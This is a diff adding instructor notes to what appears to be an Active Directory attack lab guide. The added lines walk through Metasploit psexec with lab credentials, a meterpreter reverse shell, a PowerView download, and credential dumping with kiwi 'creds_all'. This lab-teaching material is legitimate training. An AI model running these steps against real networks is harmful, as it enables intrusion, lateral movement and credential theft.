@@ -35,6 +35,21 @@ Why is DNS needed for an AD installation?
 3. Use PSExec in Metasploit to log in with found credentials
 4. Use PowerView to find Domain Admins
 
+Note:
+* Give them SMBDomain = cucyber, SMBUser = dcrockett, SMBPass = Password123, windows/x64/meterpreter/reverse_tcp, and PowerView
+1. exploit/windows/smb/psexec_psh
+2. set SMBDomain cucyber
+3. set SMBUSER Administrator
+4. set SMBPASS <hash>
+5. set payload windows/x64/meterpreter/reverse_tcp
+6. run
+7. load powershell
+8. https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView. ps1
+9. powershell_import /root/Desktop/PowerView.ps1
+10. powershell_execute Get-NetDomain
+11. load kiwi
+12. creds_all
+
 
 
 ### Dumping credentials
